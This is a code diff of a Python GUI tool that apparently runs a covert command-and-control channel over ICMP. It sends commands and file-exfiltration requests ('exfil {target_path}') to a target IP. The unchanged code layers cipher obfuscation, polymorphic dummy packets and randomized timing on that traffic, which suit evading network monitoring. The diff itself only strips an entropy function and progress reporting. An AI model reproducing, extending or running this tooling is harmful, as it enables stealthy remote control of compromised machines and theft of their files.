@@ -14,7 +14,6 @@ import hashlib
 import lzma
 import base64
 import os
-import math
 import atexit
 
 is_echo = False
@@ -22,7 +21,7 @@ is_echo = False
 ICMP_ID = 0x1111       
 DEFAULT_SHIFT_VALUE = 1
 DEFAULT_RAILFENCE_RAILS = 4
-DEFAULT_BIT_RAILFENCE_RAILS = 7        # Set at >=2
+DEFAULT_BIT_RAILFENCE_RAILS = 7		# Set at >=2
 HANDSHAKE_PREFIX = b"SYNC:"
 ACK_PREFIX = b"ACK:"
 PROBE_COMMAND = b"probe"  
@@ -46,20 +45,6 @@ def suppress_icmp(family):
 def unsuppress_icmp(ignore_file):
     with open(ignore_file, 'w') as f:
         f.write('0\n')
-
-def calculate_entropy(data):
-    if not data:
-        return 0.0
-    freq = [0] * 256
-    for byte in data:
-        freq[byte] += 1
-    total = len(data)
-    ent = 0.0
-    for f in freq:
-        if f > 0:
-            p = f / total
-            ent -= p * math.log2(p)
-    return ent
 
 def checksum(source_string):
     sum_val = 0
@@ -345,25 +330,6 @@ def ms_since_midnight():
     now = datetime.datetime.now().time()
     return now.hour * 3600000 + now.minute * 60000 + now.second * 1000 + now.microsecond // 1000
 
-extra_bytes = {
-    8: 0, 0: 0,
-    13: 12, 14: 12,
-    17: 4, 18: 4,
-    15: 0, 16: 0,
-    10: 4, 9: 8,
-    128: 0, 129: 0,
-    133: 4, 134: 12,
-    37: 0, 38: 0,
-    135: 20, 136: 20,
-    253: 0, 254: 0,
-    130: 20, 131: 20,
-    35: 0, 36: 2,
-    30: 16,  
-    40: 4,   
-    42: 6,  
-    43: 8   
-}
-
 def _get_base_dummy(icmp_type, icmp_id, icmp_sequence):
     if icmp_type in [0x11, 0x16]:
         return b''
@@ -539,7 +505,7 @@ def send_dummy(target_ip, req_type, icmp_id, seq_queue, family, proto, poly_seed
     dummy_payload = get_dummy_payload(req_type, icmp_id, icmp_sequence, poly_seed, mutation_count)
     send_packet(target_ip, req_type, icmp_id, icmp_sequence, dummy_payload, family, proto, poly_seed, mutation_count)
 
-def send_command(target_ip, command, req_type, icmp_id, seq_queue, cmd_prefix, padding_seed, sub_table, shift, railfence_rails, bit_rails, family, proto, is_file=False, progress_callback=None, cancel_event=None, poly_seed=None, mutation_count=3, delay_mode=None, delay_min=1, delay_max=3, layers=None, selected_ops=None):
+def send_command(target_ip, command, req_type, icmp_id, seq_queue, cmd_prefix, padding_seed, sub_table, shift, railfence_rails, bit_rails, family, proto, is_file=False, cancel_event=None, poly_seed=None, mutation_count=3, delay_mode=None, delay_min=1, delay_max=3, layers=None, selected_ops=None):
     actual_payload = cmd_prefix + command.encode('utf-8')
 
     force_frag = is_file
@@ -568,8 +534,6 @@ def send_command(target_ip, command, req_type, icmp_id, seq_queue, cmd_prefix, p
             seq_queue[target_ip] = (seq_queue[target_ip] + 1) % 65536
         send_packet(target_ip, req_type, icmp_id, icmp_sequence, encrypted_init, family, proto, poly_seed, mutation_count)
         sent += 1
-        if progress_callback:
-            progress_callback(sent, total_packets)
         time.sleep(compute_delay(delay_mode, delay_min, delay_max))
         if cancel_event and cancel_event.is_set():
             return "Command canceled"
@@ -588,8 +552,6 @@ def send_command(target_ip, command, req_type, icmp_id, seq_queue, cmd_prefix, p
                 seq_queue[target_ip] = (seq_queue[target_ip] + 1) % 65536
             send_packet(target_ip, req_type, icmp_id, icmp_sequence, encrypted_frag, family, proto, poly_seed, mutation_count)
             sent += 1
-            if progress_callback:
-                progress_callback(sent, total_packets)
             time.sleep(compute_delay(delay_mode, delay_min, delay_max))
             if force_frag and time.time() - pause_timer > 900:
                 pause_dur = random.uniform(60, 180)
@@ -888,7 +850,7 @@ def create_tab(notebook, target_ip, req_type, rep_type, icmp_id, seq_queue, fami
         exfil_cancel_event.clear()
         root.after(0, lambda: exfil_cancel_button.config(state=tk.NORMAL))
         def do_exfil():
-            send_command(target_ip, f"exfil {target_path}", req_type, icmp_id, seq_queue, cmd_prefix, padding_seed, sub_table, shift, railfence_rails, bit_rails, family, proto, is_file=True, progress_callback=None, cancel_event=exfil_cancel_event, poly_seed=poly_seed, mutation_count=mutation_count, delay_mode=delay_mode, delay_min=delay_min, delay_max=delay_max, layers=layers, selected_ops=selected_ops)
+            send_command(target_ip, f"exfil {target_path}", req_type, icmp_id, seq_queue, cmd_prefix, padding_seed, sub_table, shift, railfence_rails, bit_rails, family, proto, is_file=True, cancel_event=exfil_cancel_event, poly_seed=poly_seed, mutation_count=mutation_count, delay_mode=delay_mode, delay_min=delay_min, delay_max=delay_max, layers=layers, selected_ops=selected_ops)
         threading.Thread(target=do_exfil, daemon=True).start()
 
     exfil_button = tk.Button(exfil_frame, text="Exfil File", command=exfil_file, bg='black', fg='#FF00FF', font=('Courier', 10, 'bold'))
